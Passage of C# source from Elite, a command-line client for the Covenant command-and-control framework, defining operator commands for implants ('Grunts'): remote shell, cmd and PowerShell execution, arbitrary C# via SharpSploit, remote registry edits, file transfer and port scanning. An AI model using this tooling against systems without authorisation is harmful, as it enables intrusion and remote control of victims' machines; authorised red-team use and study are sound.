﻿// Author: Ryan Cobb (@cobbr_io)
// Project: Elite (https://github.com/cobbr/Elite)
// License: GNU GPLv3

using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;

using Microsoft.Rest;

using Covenant.API;
using Covenant.API.Models;

using Elite.Menu.Tasks;

namespace Elite.Menu.Grunts
{
    public class MenuCommandGruntInteractShow : MenuCommand
    {
        public MenuCommandGruntInteractShow()
        {
            this.Name = "Show";
            this.Description = "Show details of the Grunt.";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            menuItem.Refresh();
            Grunt grunt = ((GruntInteractMenuItem)menuItem).Grunt;
            List<Grunt> children = ((GruntInteractMenuItem)menuItem).Children;
            List<GruntTasking> tasks = ((GruntInteractMenuItem)menuItem).Tasks;

            EliteConsoleMenu menu = new EliteConsoleMenu(EliteConsoleMenu.EliteConsoleMenuType.Parameter, "Grunt: " + grunt.Name);
            menu.Rows.Add(new List<string> { "Name:", grunt.Name });
            menu.Rows.Add(new List<string> { "CommType:", grunt.CommType.ToString() });
            menu.Rows.Add(new List<string> { "Connected Grunts:", String.Join(",", children.Select(C => C.Name)) });
            menu.Rows.Add(new List<string> { "Hostname:", grunt.Hostname });
            menu.Rows.Add(new List<string> { "IPAdress:", grunt.IpAddress });
            menu.Rows.Add(new List<string> { "User:", grunt.UserDomainName + "\\" + grunt.UserName });
            menu.Rows.Add(new List<string> { "Status:", grunt.Status.ToString() });
            menu.Rows.Add(new List<string> { "LastCheckIn:", grunt.LastCheckIn.ToString() });
            menu.Rows.Add(new List<string> { "ActivationTime:", grunt.ActivationTime.ToString() });
            menu.Rows.Add(new List<string> { "Integrity:", grunt.Integrity.ToString() });
            menu.Rows.Add(new List<string> { "OperatingSystem:", grunt.OperatingSystem });
            menu.Rows.Add(new List<string> { "Process:", grunt.Process });
            menu.Rows.Add(new List<string> { "Delay:", grunt.Delay.ToString() });
            menu.Rows.Add(new List<string> { "JitterPercent:", grunt.JitterPercent.ToString() });
            menu.Rows.Add(new List<string> { "ConnectAttempts:", grunt.ConnectAttempts.ToString() });
            menu.Rows.Add(new List<string> { "KillDate:", grunt.KillDate.ToString() });
            menu.Rows.Add(new List<string> { "Tasks Assigned:", String.Join(",", tasks.Select(T => T.Name)) });
            menu.Rows.Add(new List<string> { "Tasks Completed:",
                String.Join(",", tasks.Where(GT => GT.Status == GruntTaskingStatus.Completed).Select(T => T.Name))
            });
            menu.Print();
        }
    }

    public class MenuCommandGruntInteractKill : MenuCommand
    {
        public MenuCommandGruntInteractKill(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Kill";
            this.Description = "Kill the Grunt.";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override async void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: kill");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }

            Grunt grunt = ((GruntInteractMenuItem)menuItem).Grunt;
            EliteConsole.PrintFormattedWarning("Kill Grunt: " + grunt.Name + "? [y/N] ");
            string input = EliteConsole.Read();
            if (!input.StartsWith("y", StringComparison.OrdinalIgnoreCase))
            {
                return;
            }

            GruntTasking gruntTasking = new GruntTasking
            {
                Id = 0,
                GruntId = grunt.Id,
                TaskId = 1,
                Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                Status = GruntTaskingStatus.Uninitialized,
                Type = GruntTaskingType.Kill,
                TaskingCommand = UserInput,
                TokenTask = false
            };
            try
            {
                await this.CovenantClient.ApiGruntsByIdTaskingsPostAsync(grunt.Id ?? default, gruntTasking);
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }
    }

    public class MenuCommandGruntInteractSet : MenuCommand
    {
        public MenuCommandGruntInteractSet(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Set";
            this.Description = "Set a Grunt Variable.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "Option",
                    Values = new List<MenuCommandParameterValue> {
                        new MenuCommandParameterValue { Value = "Delay" },
                        new MenuCommandParameterValue { Value = "JitterPercent" },
                        new MenuCommandParameterValue { Value = "ConnectAttempts" }
                    }
                },
                new MenuCommandParameter { Name = "Value" }
            };
        }

        public override async void Command(MenuItem menuItem, string UserInput)
        {
            Grunt grunt = ((GruntInteractMenuItem)menuItem).Grunt;
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count != 3 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }

            if (int.TryParse(commands[2], out int n))
            {
                GruntTasking tasking = null;
                if (commands[1].Equals("delay", StringComparison.OrdinalIgnoreCase))
                {
                    tasking = new GruntTasking
                    {
                        Id = 0,
                        GruntId = grunt.Id,
                        TaskId = 1,
                        Status = GruntTaskingStatus.Uninitialized,
                        Type = GruntTaskingType.SetDelay,
                        TaskingMessage = n.ToString(),
                        TaskingCommand = UserInput,
                        TokenTask = false
                    };
                }
                else if (commands[1].Equals("jitterpercent", StringComparison.OrdinalIgnoreCase))
                {
                    tasking = new GruntTasking
                    {
                        Id = 0,
                        GruntId = grunt.Id,
                        TaskId = 1,
                        Status = GruntTaskingStatus.Uninitialized,
                        Type = GruntTaskingType.SetJitter,
                        TaskingMessage = n.ToString(),
                        TaskingCommand = UserInput,
                        TokenTask = false
                    };
                }
                else if (commands[1].Equals("connectattempts", StringComparison.OrdinalIgnoreCase))
                {
                    tasking = new GruntTasking
                    {
                        Id = 0,
                        GruntId = grunt.Id,
                        TaskId = 1,
                        Status = GruntTaskingStatus.Uninitialized,
                        Type = GruntTaskingType.SetConnectAttempts,
                        TaskingMessage = n.ToString(),
                        TaskingCommand = UserInput,
                        TokenTask = false,
                    };
                }
                try
                {
                    await this.CovenantClient.ApiGruntsByIdTaskingsPostAsync(grunt.Id ?? default, tasking);
                }
                catch (HttpOperationException e)
                {
                    EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
                }
            }
            else
            {
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
        }
    }

    public class MenuCommandGruntInteractWhoAmI : MenuCommand
    {
        public MenuCommandGruntInteractWhoAmI()
        {
            this.Name = "whoami";
            this.Description = "Gets the username of the currently used/impersonated token.";
            this.Parameters = new List<MenuCommandParameter> { };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: whoami");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractListDirectory : MenuCommand
    {
        public MenuCommandGruntInteractListDirectory()
        {
            this.Name = "ls";
            this.Description = "Get a listing of the current directory.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Path" },
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (!commands.Any() || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: ls <path>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { "ListDirectory" });
            if (commands.Count() > 1)
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Path " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
            }
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractChangeDirectory : MenuCommand
    {
        public MenuCommandGruntInteractChangeDirectory()
        {
            this.Name = "cd";
            this.Description = "Change the current directory.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Append Directory" },
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify Directory to change to.");
                EliteConsole.PrintFormattedErrorLine("Usage: cd <append_directory>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { "ChangeDirectory" });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Directory " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractProcessList : MenuCommand
    {
        public MenuCommandGruntInteractProcessList()
        {
            this.Name = "ps";
            this.Description = "Get a list of currently running processes.";
            this.Parameters = new List<MenuCommandParameter> { };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: ps");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { "ProcessList" });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractGetRegistryKey : MenuCommand
    {
        public MenuCommandGruntInteractGetRegistryKey()
        {
            this.Name = "GetRegistryKey";
            this.Description = "Gets a value stored in registry.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "RegPath",
                    Values = new List<MenuCommandParameterValue> {
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_USER\\" },
                        new MenuCommandParameterValue { Value = "HKEY_LOCAL_MACHINE\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CLASSES_ROOT\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_CONFIG\\" },
                    }
                }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetRegistryKey <regpath>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set RegPath " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractSetRegistryKey : MenuCommand
    {
        public MenuCommandGruntInteractSetRegistryKey()
        {
            this.Name = "SetRegistryKey";
            this.Description = "Sets a value into the registry.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "RegPath",
                    Values = new List<MenuCommandParameterValue> {
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_USER\\" },
                        new MenuCommandParameterValue { Value = "HKEY_LOCAL_MACHINE\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CLASSES_ROOT\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_CONFIG\\" },
                    }
                },
                new MenuCommandParameter { Name = "Value" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 3 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: SetRegistryKey <regpath> <value>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set RegPath " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Value " + commands[2]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractGetRemoteRegistryKey : MenuCommand
    {
        public MenuCommandGruntInteractGetRemoteRegistryKey()
        {
            this.Name = "GetRemoteRegistryKey";
            this.Description = "Gets a value stored in registry on a remote system.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Hostname" },
                new MenuCommandParameter {
                    Name = "RegPath",
                    Values = new List<MenuCommandParameterValue> {
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_USER\\" },
                        new MenuCommandParameterValue { Value = "HKEY_LOCAL_MACHINE\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CLASSES_ROOT\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_CONFIG\\" },
                    }
                }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 3 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetRemoteRegistryKey <hostname> <regpath>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Hostname " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set RegPath " + commands[2]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractSetRemoteRegistryKey : MenuCommand
    {
        public MenuCommandGruntInteractSetRemoteRegistryKey()
        {
            this.Name = "SetRemoteRegistryKey";
            this.Description = "Sets a value into the registry on a remote system.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Hostname" },
                new MenuCommandParameter {
                    Name = "RegPath",
                    Values = new List<MenuCommandParameterValue> {
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_USER\\" },
                        new MenuCommandParameterValue { Value = "HKEY_LOCAL_MACHINE\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CLASSES_ROOT\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_CONFIG\\" },
                    }
                },
                new MenuCommandParameter { Name = "Value" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 4 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: SetRemoteRegistryKey <hostname> <regpath> <value>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Hostname " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set RegPath " + commands[2]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Value " + commands[3]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractUpload : MenuCommand
    {
        public MenuCommandGruntInteractUpload()
        {
            this.Name = "Upload";
            this.Description = "Upload a file.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Local File Path" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify LocalFilePath of File to upload.");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set LocalFilePath " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractDownload : MenuCommand
    {
        public MenuCommandGruntInteractDownload()
        {
            this.Name = "Download";
            this.Description = "Download a file.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "File Name" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify FileName to download.");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set FileName " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractAssembly : MenuCommand
    {
        public MenuCommandGruntInteractAssembly()
        {
            this.Name = "Assembly";
            this.Description = "Execute a .NET Assembly EntryPoint.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Local File Path" },
                new MenuCommandParameter { Name = "Parameters" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify LocalFilePath containing Assembly to execute.");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set LocalFilePath " + commands[1]);
            if (commands.Count > 2)
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Parameters " + String.Join(" ", commands.GetRange(2, commands.Count() - 2)));
            }
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractAssemblyReflect : MenuCommand
    {
        public MenuCommandGruntInteractAssemblyReflect()
        {
            this.Name = "AssemblyReflect";
            this.Description = "Execute a .NET Assembly method using reflection.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Local File Path" },
                new MenuCommandParameter { Name = "Type Name" },
                new MenuCommandParameter { Name = "Method Name" },
                new MenuCommandParameter { Name = "Parameters" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify LocalFilePath containing Assembly to execute.");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            if (commands.Count > 5)
            {
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set LocalFilePath " + commands[1]);
            if (commands.Count > 2)
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set TypeName " + commands[2]);
            }
            if (commands.Count > 3)
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set MethodName " + commands[3]);
            }
            if (commands.Count > 4)
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Parameters " + commands[4]);
            }
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractSharpShell : MenuCommand
    {
        private static readonly string WrapperFunctionFormat = 
@"using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Security;
using System.Security.Principal;
using System.Collections.Generic;

using SharpSploit.Credentials;
using SharpSploit.Enumeration;
using SharpSploit.Execution;
using SharpSploit.Generic;
using SharpSploit.Misc;

public static class Task
{{
    public static object Execute()
    {{
        {0}
    }}
}}";

        public MenuCommandGruntInteractSharpShell(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "SharpShell";
            this.Description = "Execute C# code.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "C# Code" }
            };
        }

        public override async void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = UserInput.Split(" ").ToList();
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify C# code to run.");
                EliteConsole.PrintFormattedErrorLine("Usage: SharpShell <c#_code>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            try
            {
                string csharpcode = String.Join(" ", commands.GetRange(1, commands.Count() - 1));
                GruntTask task = await this.CovenantClient.ApiGrunttasksPostAsync(new GruntTask
                {
                    Name = "SharpShell",
                    Description = "Execute custom c# code from SharpShell.",
                    ReferenceAssemblies = new List<string> { "System.DirectoryServices.dll", "System.IdentityModel.dll", "System.Management.dll", "System.Management.Automation.dll" },
                    ReferenceSourceLibraries = new List<string> { "SharpSploit" },
                    EmbeddedResources = new List<string>(),
                    Code = String.Format(WrapperFunctionFormat, csharpcode),
                    Options = new List<GruntTaskOption>()
                });

                Grunt grunt = ((GruntInteractMenuItem)menuItem).Grunt;
                GruntTasking gruntTasking = new GruntTasking
                {
                    Id = 0,
                    Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                    TaskId = task.Id,
                    GruntId = grunt.Id,
                    Status = GruntTaskingStatus.Uninitialized,
                    Type = GruntTaskingType.Assembly,
                    TaskingCommand = UserInput,
                    TokenTask = false
                };
                await this.CovenantClient.ApiGruntsByIdTaskingsPostAsync(grunt.Id ?? default, gruntTasking);
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }
    }

    public class MenuCommandGruntInteractShell : MenuCommand
    {
        public MenuCommandGruntInteractShell()
        {
            this.Name = "Shell";
            this.Description = "Execute a Shell command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Shell Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = UserInput.Split(" ").ToList();
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a ShellCommand.");
                EliteConsole.PrintFormattedErrorLine("Usage: Shell <shell_command>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            string ShellCommandInput = String.Join(" ", commands.GetRange(1, commands.Count() - 1));
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ShellCommand " + ShellCommandInput);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractShellCmd : MenuCommand
    {
        public MenuCommandGruntInteractShellCmd()
        {
            this.Name = "ShellCmd";
            this.Description = "Execute a Shell command using \"cmd.exe /c\".";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Shell Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = UserInput.Split(" ").ToList();
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a ShellCommand.");
                EliteConsole.PrintFormattedErrorLine("Usage: ShellCmd <shell_command>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            string ShellCommandInput = String.Join(" ", commands.GetRange(1, commands.Count() - 1));
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ShellCommand " + ShellCommandInput);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractPowerShell : MenuCommand
    {
        public MenuCommandGruntInteractPowerShell()
        {
            this.Name = "PowerShell";
            this.Description = "Execute a PowerShell command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "PowerShell Code" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = UserInput.Split(" ").ToList();
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify PowerShellCode to run.");
                EliteConsole.PrintFormattedErrorLine("Usage: PowerShell <powershell_code>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }

            string PowerShellImport = ((GruntInteractMenuItem)menuItem).PowerShellImport.Trim();
            string PowerShellCodeInput = PowerShellImport + "\r\n" + String.Join(" ", commands.GetRange(1, commands.Count() - 1));

            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set PowerShellCommand " + PowerShellCodeInput);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractPowerShellImport : MenuCommand
    {
        public MenuCommandGruntInteractPowerShellImport()
        {
            this.Name = "PowerShellImport";
            this.Description = "Import a local PowerShell file.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "File Path" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify path to file to import.");
                EliteConsole.PrintFormattedErrorLine("Usage: PowerShellImport <file_path>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }

            string filename = Path.Combine(Common.EliteDataFolder, commands[1]);
            if (!File.Exists(filename))
            {
                EliteConsole.PrintFormattedErrorLine("Local file path \"" + filename + "\" does not exist.");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }

            string read = File.ReadAllText(filename);
            ((GruntInteractMenuItem)menuItem).PowerShellImport = read;

            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { "PowerShell" });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set PowerShellCommand " + read);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractPortScan : MenuCommand
    {
        public MenuCommandGruntInteractPortScan()
        {
            this.Name = "PortScan";
            this.Description = "Conduct a TCP port scan of specified hosts and ports.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Computer Names" },
